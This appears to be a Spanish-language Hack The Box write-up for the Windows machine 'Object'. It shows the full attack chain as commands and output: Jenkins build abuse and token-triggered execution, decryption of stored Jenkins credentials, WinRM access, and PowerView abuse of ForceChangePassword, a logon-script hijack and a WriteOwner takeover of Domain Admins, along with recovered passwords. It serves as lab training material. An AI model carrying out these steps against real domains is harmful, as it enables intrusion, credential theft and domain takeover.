---
layout      : post
title       : "Maquina Object - htb writeup"
author      : Firtsmiracle
image       : assets/images/HTB/htb-writeup-Object/object.png
category    : [ hackthebox ]
tags        : [ Active Directory, Jenkins Exploitation (New Job + Abusing Build Periodically), Jenkins Exploitation (Abusing Trigger builds remotely using TOKEN), Firewall Enumeration Techniques, Jenkins Password Decrypt, BloodHound Enumeration, Abusing ForceChangePassword with PowerView, Abusing GenericWrite (Set-DomainObject - Setting Script Logon Path), Abusing WriteOwner (Takeover Domain Admins Group)]
---

El dia de hoy vamos a resolver `Oject` de `hackthebox` una maquina `windows` de dificultad `dificil`, esta vez nos enfrentamos a un `jenkyll` el cual vamos a explotarlo de dos maneras, la primera a traves de la ejecución de una tarea ejecutada periodicamente y la otra a traves del empleo de un token, despues enumeraremos las reglas de firewall para verificar las restricciones y aprochecharemos el acceso a los archivos del `jenkins` para desencriptar una contraseña que nos permitira conectarnos al sistema. Ya estando dentro luego de realizar una enumeración con `bloodhound`, abusaremos del permiso de `ForceChangedPassword` para cambiar la contraseña de un usuario y una vez como este aprovecharnos de `GenericWrite` para retocar los atributos de otro usuario manipulando el comportamiento de acción a traves del inicio de sesión y migrar a otro usuario para finalmente con el privilegio `WriteOwner` asigarnos el privilegio de `DomainAdmins` y asi obtener acceso completo al sistema.
    
 Maquina bastante interesante.

Comenzamos como es de costumbre creando un directorio con el nombre de la maquina:

```bash
❯ mkdir Object
❯ ls

 Object
```
Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:

```bash
❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
```

## ENUMERACION [#](#enumeracion) {#enumeracion}
 
Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando `ping`:

```bash
❯ ping -c 1 10.10.11.132
PING 10.10.11.132 (10.10.11.132) 56(84) bytes of data.
64 bytes from 10.10.11.132: icmp_seq=1 ttl=127 time=143 ms

--- 10.10.11.132 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 143.382/143.382/143.382/0.000 ms
```
Vemos que la maquina nos responde, con un ttl de `127` y por proximidad seria correspondiente a una maquina `windows`.

### ESCANEO DE PUERTOS

| Parámetro  |                    Descripción                          |
| -----------|:--------------------------------------------------------|                                           
|[-p-](#enumeracion)      | Escaneamos todos los 65535 puertos.                     |
|[--open](#enumeracion)     | Solo los puertos que estén abiertos.                    |
|[-v](#enumeracion)        | Permite ver en consola lo que va encontrando (verbose). |
|[-oG](#enumeracion)        | Guarda el output en un archivo con formato grepeable para que mediante una funcion de [S4vitar](https://s4vitar.github.io/) nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles |


Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre `openPorts`:

```java
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.132 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-26 17:58 -05
Initiating SYN Stealth Scan at 17:58
Scanning 10.10.11.132 [65535 ports]
Discovered open port 80/tcp on 10.10.11.132
Discovered open port 8080/tcp on 10.10.11.132
Discovered open port 5985/tcp on 10.10.11.132
Completed SYN Stealth Scan at 17:58, 26.99s elapsed (65535 total ports)
Nmap scan report for 10.10.11.132
Host is up, received user-set (0.20s latency).
Scanned at 2023-10-26 17:58:21 -05 for 27s
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE    REASON
80/tcp   open  http       syn-ack ttl 127
5985/tcp open  wsman      syn-ack ttl 127
8080/tcp open  http-proxy syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 27.10 seconds
           Raw packets sent: 131085 (5.768MB) | Rcvd: 22 (968B)
```

### ESCANEO DE VERSION Y SERVICIOS

```java
❯ nmap -sCV -p80,5985,8080 10.10.11.132 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-26 18:00 -05
Nmap scan report for 10.10.11.132
Host is up (0.25s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Mega Engines
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8080/tcp open  http    Jetty 9.4.43.v20210629
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-server-header: Jetty(9.4.43.v20210629)
| http-robots.txt: 1 disallowed entry 
|_/
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.27 seconds
```

Entre los puertos abiertos mas relevantes podemos visualizar:

| Puerto | Servicio | Versión |
| ------ | -------- | --------|
| 80     | HTTP     |Microsoft IIS httpd 10.0 |
| 8080     | HTTP     |  Jetty 9.4.43.v20210629 |
| 5985     | HTTP     |  WINRM |


## EXPLOTACION [#](#explotacion) {#explotacion}

Como vemos que los puertos `80` y `8080` corresponde a un servicio web con `whatweb` vamos a tratar de enumerar las tecnolologias que emplean. 

```bash
❯ whatweb http://10.10.11.132
http://10.10.11.132 [200 OK] Country[RESERVED][ZZ], Email[ideas@object.htb], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.132], JQuery[2.1.3], Microsoft-IIS[10.0], Modernizr, Script, Title[Mega Engines]
❯ whatweb http://10.10.11.132:8080
http://10.10.11.132:8080 [403 Forbidden] Cookies[JSESSIONID.c4a63e7b], Country[RESERVED][ZZ], HTTPServer[Jetty(9.4.43.v20210629)], HttpOnly[JSESSIONID.c4a63e7b], IP[10.10.11.132], Jenkins[2.317], Jetty[9.4.43.v20210629], Meta-Refresh-Redirect[/login?from=%2F], Script, UncommonHeaders[x-content-type-options,x-hudson,x-jenkins,x-jenkins-session]
http://10.10.11.132:8080/login?from=%2F [200 OK] Cookies[JSESSIONID.c4a63e7b], Country[RESERVED][ZZ], HTML5, HTTPServer[Jetty(9.4.43.v20210629)], HttpOnly[JSESSIONID.c4a63e7b], IP[10.10.11.132], Jenkins[2.317], Jetty[9.4.43.v20210629], PasswordField[j_password], Script[text/javascript], Title[Sign in [Jenkins]], UncommonHeaders[x-content-type-options,x-hudson,x-jenkins,x-jenkins-session,x-instance-identity], X-Frame-Options[sameorigin]
```

Vemos que nos enfrentamos a un `IIS` y en el puerto `8080` a un `jenkyll`, asi que vamos a proceder a abrirnos el servicio en nuestro navegador.

![](/assets/images/HTB/htb-writeup-Object/obje1.PNG)

![](/assets/images/HTB/htb-writeup-Object/obje2.PNG)

Vemos la opcion de crear cuenta, asi vamos a proceder a registrarnos.

![](/assets/images/HTB/htb-writeup-Object/obje3.PNG)

Una vez creamos nuestra cuenta, nos redirigimos a un panel de usuario.

![](/assets/images/HTB/htb-writeup-Object/obje4.PNG)

Dentro podemos crear un proyecto al cual llamare `test`.

![](/assets/images/HTB/htb-writeup-Object/obje5.PNG)

Tendremos una serie de opciones como agregar un nombre.

![](/assets/images/HTB/htb-writeup-Object/obje6.PNG)


Y en la parte de `build triggers`, seleccionar que se ejecute periodicamente y configurar la ejecución cada minuto como si fuera una tarea cron.

![](/assets/images/HTB/htb-writeup-Object/obje7.PNG)


Despues en `build` seleccionar ejecutar comando de windows.

![](/assets/images/HTB/htb-writeup-Object/obje8.PNG)

Aqui agregaremos el comando que deseamos ejecutar, Aplicamos los cambios y guardamos.

![](/assets/images/HTB/htb-writeup-Object/obje9.PNG)

Pasado un minuto vemos en nuestro `build history` vemos dos compilaciones.

![](/assets/images/HTB/htb-writeup-Object/obje10.PNG)


Seleccionamos cualquiera y en `console output` vemos que se ejecuto el comando correctamente.

![](/assets/images/HTB/htb-writeup-Object/obje11.PNG)


Otra forma mas comoda en la que podemos ejecutar comandos es a traves de la creación de un token, esto podemos hacerlo en la configuración de nuestro perfil.

![](/assets/images/HTB/htb-writeup-Object/obje12.PNG)

Ahora en la configuración de nuestro proyecto debemos indicarle esta vez en lanzar ejecuciones remotas y ahora a esa `url` generada debemos de tramitarle una petición con la autenticacion requerida, donde debemos indicarle nuestro usuario y el token.

![](/assets/images/HTB/htb-writeup-Object/obje13.PNG)

Esta vez trataremos de ejecutar otro comando para listar el directorio actual.


![](/assets/images/HTB/htb-writeup-Object/obje14.PNG)

Lanzamos la petición con `curl`.

```bash
❯ curl -s -X GET "http://fmiracle:1120abc86ec7661ac09d63349eb055baff@10.10.11.132:8080/job/test/build?token=myToken"
```
Recargamos la pagina y vemos que se genero otro build.

![](/assets/images/HTB/htb-writeup-Object/obje15.PNG)

Seleccionamos el nuevo build y vemos que el codigo se ejecuto correctamente.

![](/assets/images/HTB/htb-writeup-Object/obje16.PNG)


Ahora podriamos tratar de ganar acceso al sistema a traves de una conexión por `tcp o udp` a nuestra maquina, pero si hacemos el mismo proceso y ejecutamos esta sentencia en `powershell` podemos ver mediante las reglas de firewall que unicamente tenemos permitido el `icmp`.

![](/assets/images/HTB/htb-writeup-Object/obje17.PNG)



![](/assets/images/HTB/htb-writeup-Object/obje18.PNG)

Vimos anteriormente que listando el directorio existia uno llamado `.jenkys`, asi que vamos a listar los recursos dentro de este, esto lo logramos ejecutando los mismos pasos anteriores.

![](/assets/images/HTB/htb-writeup-Object/obje19.PNG)

Vemos los directorios `users` y `secrets` y si lo listamos vemos los usuarios existentes.

![](/assets/images/HTB/htb-writeup-Object/obje20.PNG)


Si listamos ahora lo que hay en `admin`, encontramos un archivo `config.xml`, que si lo leemos vemos la contraseña del usuario encryptada.


![](/assets/images/HTB/htb-writeup-Object/obje21.PNG)


Esta contraseña podemos tratar de desencriptarla, pero para ello vamos a necesitar los archivos del directorio `secrets` los archivos `master.key` y `hudson.util.secret`.

![](/assets/images/HTB/htb-writeup-Object/obje22.PNG)

Primero vamos a copiarnos el `master.key`

![](/assets/images/HTB/htb-writeup-Object/obje23.PNG)

No olvidemos que hay quitar el salto de linea para que no de problemas.

```bash
❯ cat master.key| tr -d '\n' | sponge master.key
```

Ahora nos copiaremos el `hudson` pero debido a que este no es legible primero lo vamos a convertir a `base64`.

![](/assets/images/HTB/htb-writeup-Object/obje24.PNG)

Una vez que tenemos los 3 archivos.

```bash
❯ ls
 config.xml   hudson.util.Secret   master.key
```

Vamos a utilizar la herramienta del repositorio de `hoto`:

* [jenkins-credentials-decryptor](https://github.com/hoto/jenkins-credentials-decryptor)

Solo debes ejecutar este comando para tenerla.

```bash
curl -L \
  "https://github.com/hoto/jenkins-credentials-decryptor/releases/download/1.2.0/jenkins-credentials-decryptor_1.2.0_$(uname -s)_$(uname -m)" \
   -o jenkins-credentials-decryptor

chmod +x jenkins-credentials-decryptor
```

Ejecutamos con los parametros correspondientes, indicando cada archivo y obtenemos la contraseña en texto claro.

```bash
❯ ./jenkins-credentials-decryptor -c config.xml -m master.key -s hudson.util.Secret
[
  {
    "id": "320a60b9-1e5c-4399-8afe-44466c9cde9e",
    "password": "c1cdfun_d2434\u0003\u0003\u0003",
    "username": "oliver"
  }
]
```

Ahora que el servicio de `winrm` esta activo, podemos conectarnos usando estas credenciales al equipo y obtenemos la primera flag `user.txt`.

```bash
❯ evil-winrm -i 10.10.11.132 -u 'oliver' -p 'c1cdfun_d2434'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\oliver\Documents> whoami
object\oliver
```
![](/assets/images/HTB/htb-writeup-Object/rt.PNG)


## ELEVACION DE PRIVILEGIOS [#](#elevacion-de-privilegios) {#elevacion-de-privilegios}

Vamos a utilizar `sharphound` para enumerar el sistema y visualizar los resultados en `bloodhound`.

* [SharpHound.ps1](https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1)


Subimos el `sharphound` al equipo importandolo directamente con `Iex`.

```cmd
*Evil-WinRM* PS C:\Windows\Temp\Privesc> upload /home/fmiracle/machines/Oject/content/SharpHound.ps1
                                        
Info: Uploading /home/fmiracle/machines/Oject/content/SharpHound.ps1 to C:\Windows\Temp\Privesc\SharpHound.ps1
                                        
Data: 1297764 bytes of 1297764 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Windows\Temp\Privesc> Import-Module .\SharpHound.ps1
```

![](/assets/images/HTB/htb-writeup-Object/ob1.PNG)

Nos transferimos el comprimido y lo abrimos en `bloodhound`.

```cmd
*Evil-WinRM* PS C:\Windows\Temp\Privesc> download C:\Windows\Temp\Privesc\20231026165356_BloodHound.zip
                                        
Info: Downloading C:\Windows\Temp\Privesc\20231026165356_BloodHound.zip to 20231026165356_BloodHound.zip
                                        
Info: Download successful!
```

![](/assets/images/HTB/htb-writeup-Object/ob2.PNG)

Observamos que el usuario `oliver` tenemos el permiso de `ForceChangedPassword` sobre `smith`.

![](/assets/images/HTB/htb-writeup-Object/ob3.PNG)

Si vamos a la opción `abuse info`, vemos una manera de poder aprovecharnos de este privilegio, para ello primero debemos generar una contraseña en formato `SecureString` y ejecutar `Set-DomainUserPassword` que es una función de `Powerview.ps1` asi que primero debemos descargarnos el script e importarnos el modulo.

![](/assets/images/HTB/htb-writeup-Object/ob4.PNG)

* [PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)

```cmd
*Evil-WinRM* PS C:\Windows\Temp\Privesc> Import-Module .\PowerView.ps1
*Evil-WinRM* PS C:\Windows\Temp\Privesc> $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
*Evil-WinRM* PS C:\Windows\Temp\Privesc> Set-DomainUserPassword -Identity smith -AccountPassword $secPassword
```

Validamos y nos conectamos exitosamente como `smith` con la credencial que definimos.

```bash
❯ evil-winrm -i 10.10.11.132 -u 'smith' -p 'Password123!'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
```

Ahora que somo `smith` vamos a marcarlo como `Owned` y veamos con que permisos cuenta este nuevo usuario.

![](/assets/images/HTB/htb-writeup-Object/ob5.PNG)

Vemos que este nuevo usuario tiene el privilegio de `GenericWrite` sobre `maria`, y si vamos a `abuse info` nos dice que podemos tratar de ejecutar un `kerberoasting attack`, pero si lo tratamos de realizar no podremos crackear la contraseña debido a que la contraseña del usuario `maria` es bastante robusta.

Pero dado que con este privilegio podemos modificar los atributos de un usuario, vamos a tratar de aprovecharnos de este privilegio asignando un script de inicio de sesión al perfil de maria, de este modo cada vez que inicie sesión puedo hacer que ejecute un script que podemos definirnos.

Pero para ello debemos de usar la función `Set-DomainObject` que se encuentra en `PowerView.ps1`, asi que vamos a volver a importarlo.

```cmd
*Evil-WinRM* PS C:\ProgramData\Privesc> Import-Module .\PowerView.ps1
```
Despues vamos a crear un script `test.ps1` que copie todos los archivos del escritorio de `maria` a mi ruta actual.

```cmd
*Evil-WinRM* PS C:\ProgramData\Privesc> echo "copy C:\Users\Maria\Desktop\* C:\ProgramData\Privesc\" > test.ps1
*Evil-WinRM* PS C:\ProgramData\Privesc> Set-DomainObject -Identity maria -SET @{scriptpath='C:\ProgramData\Privesc\test.ps1'}
```

Listamos los archivos y vemos un archivo `Engine.xsl` que vamos a traernos a nuestro equipo.


![](/assets/images/HTB/htb-writeup-Object/ob6.PNG)


Abrimos el archivo con `libreoffice`.

```bash
❯ ls
 20231026165356_BloodHound.zip   config.xml   credentials.txt   Engines.xls   hudson.util.Secret   jenkins-credentials-decryptor   master.key   PowerView.ps1   SharpHound.ps1
❯ libreoffice Engines.xls
```
![](/assets/images/HTB/htb-writeup-Object/ob7.PNG)

Probamos las contraseña y obtenemos nuevas credenciales validas, `maria:W3llcr4ft3d_4cls`, nos conectamos y ahora somos el usuario `maria`.

```bash
❯ evil-winrm -i 10.10.11.132 -u 'maria' -p 'W3llcr4ft3d_4cls'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\maria\Documents> whoami
object\maria
```
Ahora como maria vemos que tenemos el privilegio de `WriteOwner` sobre `Domain Admins` y ya con esto podriamos asignarnos el grupo `Domain Admins`.

![](/assets/images/HTB/htb-writeup-Object/ob8.PNG)

Si vemos el `abuse info` nuevamente podemos ver que nos indica una forma en la que podemos hacerlo, para ello vamos a ejecutar lo siguiente, pero no sin antes volver a importar el `PowerView.ps1`.

![](/assets/images/HTB/htb-writeup-Object/ob9.PNG)

```cmd
*Evil-WinRM* PS C:\ProgramData\Privesc> Import-Module .\PowerView.ps1
*Evil-WinRM* PS C:\ProgramData\Privesc> Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity maria
*Evil-WinRM* PS C:\ProgramData\Privesc> Add-DomainObjectAcl -TargetIdentity "Domain Admins" -Rights All -PrincipalIdentity maria
```

Vemos los grupos del usuario `maria` y ya se encuentra en `Domain Admins`.

```cmd
*Evil-WinRM* PS C:\ProgramData\Privesc> net user maria
User name                    maria
Full Name                    maria garcia
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/21/2021 9:16:32 PM
Password expires             Never
Password changeable          10/22/2021 9:16:32 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 C:\ProgramData\Privesc\test.ps1
User profile
Home directory
Last logon                   10/26/2023 2:25:15 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Admins        *Domain Users
The command completed successfully.
```

Ahora tendriamos que volver a conectarnos para actualizar los permisos, dirigirnos al directorio personal del usuario `Administrator` y visualizar la segunda flag `root.txt`.

```bash
❯ evil-winrm -i 10.10.11.132 -u 'maria' -p 'W3llcr4ft3d_4cls'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\maria\Documents> cd C:\Users\Administrator\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
923cbfd8245771bc2a485f96fb451072
```

